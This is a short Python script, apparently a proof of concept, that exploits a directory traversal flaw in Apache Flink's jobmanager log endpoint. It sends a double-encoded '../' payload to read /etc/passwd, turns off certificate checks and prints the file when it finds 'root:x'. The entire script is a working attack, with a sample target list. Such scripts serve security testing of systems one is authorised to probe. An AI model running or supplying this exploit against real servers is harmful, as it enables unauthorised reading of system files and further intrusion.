import requests
import urllib3

urllib3.disable_warnings()  # 解决InsecureRequestWarning警告


def verify(url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"}
    payload = '/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd'
    target_url = url + payload
    try:

        response = requests.get(target_url, headers=headers, timeout=15, verify=False)
        if response.status_code == 200 and "root:x" in response.text:
            print("{} is apache flink directory traversal vulnerability".format(url))
            print(response.text)
        else:
            print('{} None'.format(url))
    except Exception as e:
        print('{} {}'.format(url, e))


if __name__ == '__main__':
    data = [
        "1.1.1.1:8081"  # example
    ]
    for item in data:
        verify("http://" + item.strip())
